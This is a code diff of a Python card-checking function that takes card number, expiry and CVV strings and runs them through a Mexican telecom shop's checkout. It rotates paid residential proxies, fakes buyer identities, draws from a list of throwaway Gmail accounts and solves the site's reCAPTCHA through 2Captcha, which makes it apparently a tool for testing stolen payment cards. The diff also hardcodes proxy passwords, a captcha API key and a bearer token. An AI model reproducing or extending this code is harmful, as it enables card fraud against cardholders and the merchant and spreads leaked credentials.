@@ -66,8 +66,8 @@ async def process_card(card: str) -> str:
     while retry_count < max_retries:
         try:
             #============[Funcions Need]============#
-            proxy_user = "package-311247-country-mx-region-quintana+roo-city-cancun-isp-telmex+dsl-sessionid-3uB5TQXn4x2ftAey-sessionlength-300"
-            proxy_pass = "2oUB8GoGqXVSn95G"
+            proxy_user = "package-312117-country-mx-isp-altan+redes, s.a.p.i. de c. v."
+            proxy_pass = "szwE7mwH0J5yF983"
             proxy_host = "proxy.soax.com"
             proxy_port = 5000
 
@@ -82,11 +82,16 @@ async def process_card(card: str) -> str:
                 "http": proxy_url,
                 "https": proxy_url,
             }
-                          
             
             cc_number, mes, ano_number, cvv = card.split('|')
             if len(ano_number) == 2: ano_number = "20"+ano_number
-            
+            agente_user = UserAgent()
+            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
+            proxy = "geo.iproyal.com:12321"  # SIN "http://"
+            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"
+
+            proxys={"server": f"http://{proxy_host}:{proxy_port}"}
+
             #============[Address Found]============#
             name  = usuario()['name'].split(' ')[0]
             last  = usuario()['name'].split(' ')[1]
@@ -94,10 +99,29 @@ async def process_card(card: str) -> str:
             number = random.randint(1111, 9999)
             street = f"{name} street {number}"
             phone = usuario()['phone']
-            
-           
 
             #============[Requests 1]============#
+
+            correos = [
+                "marilisaqnituk@gmail.com",
+                "flortsquitk@gmail.com",
+                "quitukferchag@gmail.com",
+                "saramanquitk@gmail.com",
+                "jorgaioquint@gmail.com",
+                "rodrigoking234@gmail.com",
+                "rodrigoquituk004@gmail.com",
+                "armeida.cate771@gmail.com",
+                "viquitukeliander@gmail.com",
+                "quityksantome@gmail.com",
+                "samanquitguajal@gmail.com",
+                "quintkdelgelo@gmail.com",
+                "squitukjomilu@gmail.com",
+                "lauranquinyuk@gmail.com",
+                "rodrigoqgomez@gmail.com",
+                "gardunoerick2@gmail.com"
+            ]
+
+            correo_seleccionado = random.choice(correos)
             headers = {
                 'authority': 'redphone.api.koonolmexico.com',
                 'accept': '*/*',
@@ -149,11 +173,60 @@ async def process_card(card: str) -> str:
             response = c.get('https://redphone.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
             time.sleep(2)
             sufijo = ''.join(str(random.randint(0, 9)) for _ in range(3))
+            api_key = "c9373bba28615938eb80b5b8a434ae8c"
+
+            # URL del sitio donde se encuentra el reCAPTCHA
+            website_url = "https://ecommerce.redphone.com.mx/paso-3"
+
+            # Sitekey del reCAPTCHA (obtenido del HTML del sitio)
+            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"
+
+            api_key = "c9373bba28615938eb80b5b8a434ae8c"
+            website_url = "https://ecommerce.redphone.com.mx"
+            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"
+            
+            # 1️⃣ Enviar tarea a 2Captcha
+            in_response = requests.post("https://2captcha.com/in.php", data={
+                "key": api_key,
+                "method": "userrecaptcha",
+                "googlekey": sitekey,
+                "pageurl": website_url,
+                "json": 1
+            }).json()
+            
+            if in_response["status"] != 1:
+                raise Exception("Error al enviar CAPTCHA:", in_response["request"])
+            
+            task_id = in_response["request"]
+            print("⏳ Tarea enviada, esperando resolución...")
+            
+            # 2️⃣ Esperar la solución
+            g_response = None
+            for i in range(30):  # hasta 30 intentos (~150s)
+                time.sleep(5)
+                res = requests.get("https://2captcha.com/res.php", params={
+                    "key": api_key,
+                    "action": "get",
+                    "id": task_id,
+                    "json": 1
+                }).json()
+                
+                if res["status"] == 1:
+                    g_response = res["request"]
+                    break
+                print("⌛ CAPTCHA aún no resuelto...")
+            
+            if g_response:
+                print("✅ CAPTCHA resuelto correctamente")
+            else:
+                print("❌ No se pudo resolver el CAPTCHA")
+                        # 2. Esperar que Anti-Captcha resuelva el captcha
 
             headers = {
                 'authority': 'redphone.api.koonolmexico.com',
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-language': 'es-ES,es;q=0.9',
+                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI2YTkzYjYxNC1lYzE4LTRlMDYtOWY4ZC1kZjhhYTY2NjllOWIifQ.ztwNlAv-V8L0M6qHfB68Q_cXupibSQCFTEguIf6XxTo',
                 'cache-control': 'no-cache',
                 'content-type': 'application/json; charset=UTF-8',
                 'origin': 'https://ecommerce.redphone.com.mx',
@@ -171,17 +244,19 @@ async def process_card(card: str) -> str:
             json_data = {
                 'user': {
                     'signup_status': 'authorized',
-                    'name': name,
-                    'last_name': last,
+                    'name': 'juan',
+                    'last_name': 'gomez',
                     'maiden_name': '',
-                    'email': email,
+                    'email': 'ericklopez12@gmail.com',
                     'phone': None,
-                    'mobile_phone': '9986326090',
+                    'mobile_phone': '9976563656',
+                    'google_recaptcha_token': g_response,
                     'privacy_acceptance': True,
                 },
             }
 
-            response = c.post('https://redphone.api.koonolmexico.com/users', headers=headers, json=json_data)
+            response = requests.post('https://redphone.api.koonolmexico.com/users', headers=headers, json=json_data)
+            print(response.text)
             responsePm = json.loads(response.text)
             user_id = responsePm["user"]["id"]
             print(user_id)
@@ -430,6 +505,7 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
 
 
 
